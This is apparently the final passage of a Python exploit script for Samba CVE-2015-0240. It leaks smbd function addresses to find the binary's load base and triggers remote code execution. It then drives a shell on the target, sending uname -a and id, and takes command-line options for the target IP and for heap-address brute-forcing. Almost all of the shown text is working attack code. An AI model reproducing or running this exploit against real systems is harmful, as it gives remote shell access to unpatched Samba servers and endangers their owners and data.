        # no target binary info. do a hard way to find them.
        """
        leak smbd_server_connection_handler for 2 purposes
        - to check if compiler does code alignment
        - to estimate smbd loaded address
          - gcc always puts smbd_server_connection_handler() function at
            beginning area of .text section
          - so the difference of smbd_server_connection_handler() offset is
            very low for all smbd binary (compiled by gcc)
        """  
        leak_smbd_server_connection_handler_addr(info)
        find_smbd_base_addr(info)
        dump_smbd_find_bininfo(info)
 
    # code execution
    if &#039;sock_exec_addr&#039; in info and call_sock_exec(info):
        s = get_socket()
        print(s.recv(4096)) # wait for &#039;shell ready&#039; message
        s.send(&#039;uname -a\n&#039;)
        print(s.recv(4096))
        s.send(&#039;id\n&#039;)
        print(s.recv(4096))
        s.send(&#039;exit\n&#039;)
        s.close()
 
 
def hex_int(x):
    return int(x,16)
     
# command arguments
parser = argparse.ArgumentParser(description=&#039;Samba CVE-2015-0240 exploit&#039;)
parser.add_argument(&#039;target&#039;, help=&#039;target IP address&#039;)
parser.add_argument(&#039;-hs&#039;, &#039;--heap_start&#039;, type=hex_int,
            help=&#039;heap address in hex to start bruteforcing&#039;)
parser.add_argument(&#039;-pa&#039;, &#039;--payload_addr&#039;, type=hex_int,
            help=&#039;exact payload (accountName) address in heap. If this is defined, no heap bruteforcing&#039;)
parser.add_argument(&#039;-sps&#039;, &#039;--start_payload_size&#039;, type=int,
            help=&#039;start payload size for bruteforcing heap address in KB. (128, 256, 512, ...)&#039;)
 
args = parser.parse_args()
requester.set_target(args.target)
 
 
try:
    do_work(args)
except KeyboardInterrupt:
    pass

